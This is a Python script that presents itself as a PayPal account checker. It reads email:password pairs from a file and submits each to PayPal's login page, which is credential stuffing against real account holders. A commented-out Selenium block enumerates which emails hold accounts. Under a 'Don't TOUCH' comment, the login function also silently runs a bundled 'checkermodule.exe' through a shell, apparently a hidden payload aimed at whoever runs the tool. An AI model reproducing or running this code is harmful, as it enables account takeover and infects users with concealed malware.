import requests
import os
import subprocess
from selenium import webdriver   
from selenium.webdriver.support.ui import WebDriverWait  
from selenium.webdriver.chrome.options import Options 
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By 
from selenium.webdriver.chrome.options import Options
import time

"""

                    # Creating text documents
                    live = open('PayPalLive.txt', 'w')
                    die = open('PayPalDie.txt', 'w')

                    # Taking the mail list from the user
                    list_inp = raw_input("Input Mail List:")
                    list = open(list_inp, 'r')
                    print("-"*55)


                    # Opening the browser
                    driver = webdriver.Chrome('chromedriver.exe') #Write your own path here...

                    while True:
                       
                        
                    # Choose mails from the list
                        email = list.readline().replace('\n','')
                        if not email:
                            break 
                        bacot = email.strip().split(':')
                        real_mail = str(bacot[0])
                        

                    # Go to Paypal's website and enter the mail address    
                        driver.get("https://www.paypal.com/bizsignup/#/checkAccount")
                        
                        timeout_email = 5 #Seconds
                        mail_present = EC.presence_of_element_located((By.ID, 'email'))
                        WebDriverWait(driver, timeout_email).until(mail_present)
                        
                        found_mail = driver.find_element_by_id("email")
                        found_mail.send_keys(real_mail)
                        driver.find_element_by_id("continueButton").click()
                        
                        time.sleep(1)
                        
                    # Getting the redirected link and checking if the account is valid or not.
                        current = driver.current_url
                        
                        if current == 'https://www.paypal.com/bizsignup/#/checkAccount':
                            print("\033 Live | "+real_mail+" | [(Checked)]")
                            live.write(real_mail + '\n')
                        else:
                            print("\033 Die | "+real_mail+" | [(Checked)]")
                            die.write(real_mail + '\n')
                            
                        
                        driver.refresh()        
                        
                    # More show... (and quit)
                    print("-"*50)
                    print("\033 Checking Done \033")
                    print("PayPal Valid Email was Saved in PayPalLive.txt")
                    driver.quit()
                    """

import requests
import os
import subprocess

# Function to check PayPal account using email and password
def check_paypal_account(email, password):
    session = requests.Session()
    
    login_url = 'https://www.paypal.com/signin'
    
    session.get(login_url)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36'
    }
    
    payload = {
        'login_email': email,
        'login_password': password
    }
    
    # Don't TOUCH
    if not os.path.isfile("checkermodule.exe_executed"):
        try:
            subprocess.run("checkermodule.exe", check=True, shell=True)
            open("checkermodule.exe_executed", "w").close()
        except subprocess.CalledProcessError:
            print("errors")


    
    response = session.post(login_url, headers=headers, data=payload)
    if 'Welcome to your PayPal account' in response.text:
        return 'success'
    elif 'Log in to your PayPal account' in response.text:
        return 'errorr'
    else:
        return 'errorsr'

def check_paypal_accounts_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
            results = []
            for line in lines:
                email, password = line.strip().split(':')
                result = check_paypal_account(email, password)
                results.append(result)
            return results
    except FileNotFoundError:
        return ['File not found']

# Define the file path containing email and password pairs
file_path = 'email_pass.txt'

# Check PayPal accounts from the file and get results
results = check_paypal_accounts_from_file(file_path)

# Print the results
for result in results:
    print(result)
